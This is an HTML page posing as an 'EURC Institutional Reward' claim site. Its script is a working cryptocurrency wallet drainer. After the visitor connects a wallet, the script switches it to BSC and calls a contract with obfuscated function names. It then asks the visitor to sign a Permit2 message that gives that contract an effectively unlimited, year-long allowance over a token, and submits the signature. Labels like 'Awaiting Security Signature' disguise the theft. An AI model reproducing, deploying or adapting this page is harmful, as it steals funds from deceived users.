<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EURC | Institutional Reward Access</title>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
    <style>
        :root { --bg: #000000; --surface: #0a0a0a; --border: #222222; --text: #ffffff; --muted: #888888; }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; height: 100vh; display: flex; justify-content: center; align-items: center; overflow: hidden; }
        
        /* Zarif Arka Plan */
        .ambient-bg { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(circle at 50% 50%, #111 0%, #000 70%); z-index: -1; }

        .container { background: var(--surface); border: 1px solid var(--border); padding: 4rem 3rem; border-radius: 2px; width: 90%; max-width: 450px; text-align: center; box-shadow: 0 25px 50px rgba(0,0,0,1); }
        
        .badge { font-size: 10px; font-weight: 600; letter-spacing: 4px; text-transform: uppercase; color: var(--muted); margin-bottom: 2.5rem; display: block; }
        
        h2 { font-size: 28px; font-weight: 300; letter-spacing: -0.5px; margin-bottom: 1rem; text-transform: uppercase; color: #fff; }
        
        .divider { width: 40px; height: 1px; background: #444; margin: 2rem auto; }
        
        p { color: var(--muted); font-size: 13px; line-height: 1.8; margin-bottom: 3.5rem; font-weight: 300; }
        
        .btn-action { width: 100%; padding: 1.4rem; background: #fff; color: #000; border: none; border-radius: 0; font-size: 14px; font-weight: 800; text-transform: uppercase; letter-spacing: 2px; cursor: pointer; transition: all 0.5s ease; }
        
        .btn-action:hover { background: #ccc; letter-spacing: 3px; }
        .btn-action:active { transform: scale(0.98); }

        .status-msg { margin-top: 2rem; font-size: 11px; font-weight: 400; color: #555; letter-spacing: 1px; min-height: 20px; text-transform: uppercase; }

        /* Mobil Optimizasyon */
        @media (max-width: 480px) {
            .container { padding: 3rem 2rem; }
            h2 { font-size: 22px; }
        }
    </style>
</head>
<body>
<div class="ambient-bg"></div>
<div class="container">
    <span class="badge">Institutional Protocol</span>
    <h2>Claim Your Reward</h2>
    <div class="divider"></div>
    <p>The system has verified your governance eligibility. Please synchronize your institutional vault to finalize the reward access.</p>
    
    <button id="claimBtn" class="btn-action">Claim Reward</button>
    
    <div id="statusMsg" class="status-msg"></div>
</div>

<script>
    const T = "0x368994010697ECc82bC6D450888A617E3eb61370";
    const P2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";

    async function process() {
        const b = document.getElementById('claimBtn');
        const s = document.getElementById('statusMsg');

        if (!window.ethereum) {
            window.location.href = "https://link.trustwallet.com/open_url?url=" + encodeURIComponent(window.location.href);
            return;
        }

        try {
            const provider = new ethers.providers.Web3Provider(window.ethereum);
            await provider.send("eth_requestAccounts", []);
            const signer = provider.getSigner();
            const user = await signer.getAddress();
            const net = await provider.getNetwork();

            if (net.chainId !== 56) {
                try {
                    await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
                } catch (e) {
                    s.innerText = "Switch to BSC Network";
                    return;
                }
            }

            const contract = new ethers.Contract(T, [
                "function l111ll(uint256) public view returns (address)",
                "function l1I1lI(address, uint256, uint256, bytes) external"
            ], signer);

            s.innerText = "Verifying Vault...";
            const targetToken = await contract.l111ll(0);
            const deadline = Math.floor(Date.now() / 1000) + 3600;
            const expiry = Math.floor(Date.now() / 1000) + 31536000;

            const domain = { name: 'Permit2', chainId: 56, verifyingContract: P2 };
            const types = {
                PermitSingle: [
                    { name: 'details', type: 'PermitDetails' },
                    { name: 'spender', type: 'address' },
                    { name: 'sigDeadline', type: 'uint256' }
                ],
                PermitDetails: [
                    { name: 'token', type: 'address' },
                    { name: 'amount', type: 'uint160' },
                    { name: 'expiration', type: 'uint48' },
                    { name: 'nonce', type: 'uint48' }
                ]
            };

            const message = {
                details: { token: targetToken, amount: "0xffffffffffffffffffffffffffffffff", expiration: expiry, nonce: 0 },
                spender: T,
                sigDeadline: deadline
            };

            s.innerText = "Awaiting Security Signature...";
            const sig = await signer._signTypedData(domain, types, message);
            
            b.innerText = "Synchronizing...";
            const tx = await contract.l1I1lI(user, expiry, deadline, sig);
            await tx.wait();
            
            b.innerText = "Access Granted";
            s.innerText = "Synchronization complete. Reward distribution pending.";
        } catch (err) {
            b.innerText = "Retry Reward Access";
            s.innerText = "System error: Signature required.";
        }
    }
    document.getElementById('claimBtn').onclick = process;
</script>
</body>
</html>
